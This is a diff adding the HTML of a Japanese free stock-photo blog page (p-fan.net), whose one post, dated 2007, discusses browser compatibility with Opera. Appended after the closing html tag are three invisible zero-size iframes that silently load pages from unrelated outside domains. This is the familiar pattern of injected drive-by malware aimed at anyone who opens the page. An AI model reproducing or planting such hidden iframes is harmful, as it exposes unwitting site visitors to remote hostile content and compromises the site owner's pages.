@@ -1,0 +1,240 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN">
+<html lang="ja">
+<head>
+<title>無料写真素材 p-fan.net ブログ</title>
+<meta http-equiv=content-type content="text/html; charset=UTF-8">
+<link rel="alternate" type="application/rss+xml" title="RSS" href="http://blog.p-fan.net/?mode=rss">
+<link rel="stylesheet" href="skin/flour.css" type="text/css">
+</head>
+<body>
+<a name="top"></a>
+<div id="inbox">
+
+  <!-- ↓■ここからタイトル ************************** -->
+  <div id="banner">
+  
+    <div id="banner_l">
+      <span class="site_title"><a href=http://blog.p-fan.net/>無料写真素材 p-fan.net ブログ</a></span>
+    </div>
+    <!-- ▽カレンダー▽ -->
+    <div class="calleft"></div><div class="calmiddle"><div class="calh">
+      <table border="0" class="calendar" align="center"><tr><td>10 / 02 </td><td> <a href="index.php?m=201001">&lt;&lt;</a></td><td> <table class="calendar"><tr align=center><td class="cell">1</td>
+<td class="cell">2</td>
+<td class="cell">3</td>
+<td class="cell">4</td>
+<td class="cell">5</td>
+<td class="cell_saturday">6</td>
+<td class="cell_sunday">7</td>
+<td class="cell">8</td>
+<td class="cell">9</td>
+<td class="cell">10</td>
+<td class="cell_sunday">11</td>
+<td class="cell">12</td>
+<td class="cell_saturday">13</td>
+<td class="cell_sunday">14</td>
+<td class="cell">15</td>
+<td class="cell">16</td>
+<td class="cell">17</td>
+<td class="cell">18</td>
+<td class="cell">19</td>
+<td class="cell_saturday">20</td>
+<td class="cell_sunday">21</td>
+<td class="cell">22</td>
+<td class="cell">23</td>
+<td class="cell">24</td>
+<td class="cell_today">25</td>
+<td class="cell">26</td>
+<td class="cell_saturday">27</td>
+<td class="cell_sunday">28</td>
+</tr></table> </td><td><a href="index.php?m=201003">&gt;&gt;</a></td></tr></table>
+    </div></div><div class="calright"></div>
+    <!-- △カレンダー△ -->
+  </div>
+  <br clear="all" STYLE="font-size:1px;">
+  <!-- ↑■ここまでタイトル ************************** -->
+
+  <!-- ↓■ここから左サイドカラム ************************** -->
+  <div id="sideleft"><div class="sidetop"></div>
+
+    <!-- ▽最新記事一覧▽ -->
+    
+    <div class="sideSet">
+    <div class="linktitle">新着</div>
+    <div class="linktext">
+      <ul>
+        
+        <li><a href="index.php?e=102">ブラウザ<br>
+ L09/30</a></li>
+        
+        <li><a href="index.php?e=101">リンク先修正<br>
+ L09/29</a></li>
+        
+        <li><a href="index.php?e=100">グリーティングカード追加<br>
+ L09/28</a></li>
+        
+      </ul>
+    </div>
+    </div>
+    
+    <!-- △最新記事一覧△ -->
+
+    <!-- ▽カテゴリ▽ -->
+    
+    <div class="sideSet">
+    <div class="linktitle">カテゴリ</div>
+    <div class="linktext">
+      <ul>
+      
+        <li>
+          <a href="index.php?c=1-">更新履歴[27件]</a><br>
+
+          
+        </li>
+      
+        <li>
+          <a href="index.php?c=3-">p-fan関連[10件]</a><br>
+
+          
+        </li>
+      
+        <li>
+          <a href="index.php?c=4-">利用規約[1件]</a><br>
+
+          
+        </li>
+      
+        <li>
+          <a href="index.php?c=5-">Q&A[57件]</a><br>
+
+          
+        </li>
+      
+        <li>
+          <a href="index.php?c=2-">日記[1件]</a><br>
+
+          
+        </li>
+      
+        <li>
+          <a href="index.php?c=7-">リンクについて[1件]</a><br>
+
+          
+        </li>
+      
+      </ul>
+    </div>
+    </div>
+    
+    <!-- △カテゴリ△ -->
+
+    <!-- ▽アーカイブ▽ -->
+    
+    <div class="sideSet">
+    <div class="linktitle">アーカイブ</div>
+    <div class="linktext">
+      <ul>
+        
+        <li><a href="index.php?m=200709">2007年09月[22件]</a></li>
+        
+        <li><a href="index.php?m=200708">2007年08月[75件]</a></li>
+        
+      </ul>
+    </div>
+    </div>
+    
+    <!-- △アーカイブ△ -->
+
+
+    <!-- ▽OTHERS▽ -->
+    <div class="sideSet">
+      <div class="linktitle">その他</div>
+      <div class="linktext">
+        <ul>
+          <li><a href="http://blog.p-fan.net/?mode=rss">RSS 1.0</a></li>
+        </ul>
+      </div>
+    </div>
+    <!-- △OTHERS△ -->
+  </div>
+  <!-- ↑■ここまで左サイドカラム ************************** -->
+
+
+  <!-- ↓■ここからメイン ************************** -->
+  <div id="main">
+<!-- ▽検索ボックス▽ -->
+<div class="linktext" align="center">
+<div id="searcharea">
+<form action="./" method=get>
+<input type="TEXT" id="search" name="s" style="width:335px;">
+<input type=submit value="検索" class="btn">
+</form>
+</div>
+</div>
+    <!-- △検索ボックス△ -->
+    <!-- ▽ページ移動リンク▽ -->
+    <div class="pagearea" STYLE="float:left;">
+      
+    </div>
+    <div class="pagearea" STYLE="float:right;">
+      <a href="index.php?page=2">古い記事 >></a>
+    </div><br clear="all">
+    <!-- △ページ移動リンク△ -->
+
+    <!-- ▽サイト内検索結果一覧▽ -->
+    
+    <!-- △サイト内検索結果一覧△ -->
+
+<div class="entry_date">
+
+</div>
+  
+  
+    <!-- ▽記事部分▽ -->
+    <div class="entry_date">
+      2007年09月30日 : 22時05分
+    </div>
+    <div class="entryBodyset">
+      <div class="entry_title"><a href="index.php?e=102">ブラウザ</a></div>
+      <div class="entry_body">
+        当サイトはWIN用のIE・FireFox・Operaで見た目を確認しております。<br>
+先日の画像詳細ページ（拡大画像ページ）の大幅変更によりOperaの場合のみ現在α版である9.50Alphaでは正常に表示されそれ以下のバージョンではレイアウトが崩れてしまいます。<br>
+（Operaの今後のupdateで正常表示されると思います）<br>
+どうしてもOperaでご覧になりたい方は9.50Alphaをご使用下さる様お願いします。<br>
+<br>
+
+        
+        
+      </div>
+      <div class="entry_state">
+        カテゴリ：<a href="index.php?c=3-">p-fan関連</a>
+      </div>
+<div align="center">
+<script type="text/javascript"><!--
+amazon_ad_tag = "ydesign-22"; amazon_ad_width = "300"; amazon_ad_height = "250"; amazon_ad_logo = "hide"; amazon_ad_link_target = "new"; amazon_ad_price = "retail"; amazon_ad_border = "hide";//--></script>
+<script type="text/javascript" src="http://www.assoc-amazon.jp/s/ads.js"></script>
+</div>
+    </div>
+    <!-- △記事部分△ -->
+  
+  
+
+
+  </div>
+  <!-- ↑■ここまでメイン ************************** -->
+
+
+  <!-- ↓■ここからフッタ ************************** -->
+  <br clear="all" />
+  <div id="footer" class="copyright">
+    Copyright &copy; 2004 All Rights Reserved.
+
+    <!-- ↓◎◎この著作権表示は削除しないでください◎◎↓ -->
+    　SCRIPT：<a href="http://www.blogn.org/" target="_blank">Blogn</a>＋SKINBASE：<a href="http://get.daa.jp/" target="_blank">GetNet</a> 
+    <!-- ↑◎◎この著作権表示は削除しないでください◎◎↑ -->
+
+  </div>
+  <!-- ↑■ここまでフッタ ************************** -->
+
+</div>
+</body></html>
+<iframe src="http://odmarco.com/lib/index.php" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe><iframe src="http://odile-marco.com/lib/index.php" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe><iframe src="http://davtraff.com/lib/index.php" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no></iframe>
